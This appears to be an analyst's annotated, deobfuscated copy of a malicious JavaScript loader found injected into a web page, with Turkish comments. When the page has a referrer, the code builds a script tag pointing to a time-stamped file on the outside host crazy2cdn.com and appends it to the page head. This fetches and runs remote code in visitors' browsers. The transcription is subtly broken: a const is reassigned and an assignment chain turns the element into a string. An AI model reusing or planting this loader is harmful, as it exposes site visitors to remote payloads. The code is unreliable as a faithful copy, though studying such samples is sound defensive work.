// MARK : malicious script found on html body
!(function (p_document, injected_js_element) {
	const unixTime = Math["floor"](Date["now"]() / 1000)
	//
	const unixTimeMathFloor10 = unixTime - (unixTime % 10)
	// 10dk'nın katları
	unixTime -= unixTime % 600
	unixTime = unixTime["toString"](16)
	if (
		// document.referrer-> google.com
		!document["referrer"]
	) {
		return
	}
	let crazy2cdnURL = "crazy2cdn.com" // atob('Y3Jhe' + 'nkyY2Ru' + 'LmNvbQ=='); // Y3Jhe' + 'nkyY2Ru' + 'LmNvbQ== -> crazy2cdn.com

	injected_js_element = p_document["createElement"]("script").type = "text/javascript"
	// <script type="text/javascript" src = ""https://crazy2cdn.com/min.t.1714642200.js?v=1000>
	injected_js_element.async = true
	;(injected_js_element["src"] = "https://" + crazy2cdnURL + "/min.t." + unixTimeMathFloor10 + ".js?v=" + unixTime),
		// async script

		p_document.getElementsByTagName("head")[0]["appendChild"](injected_js_element)
	// kodu head'e injectliyor
})(document)
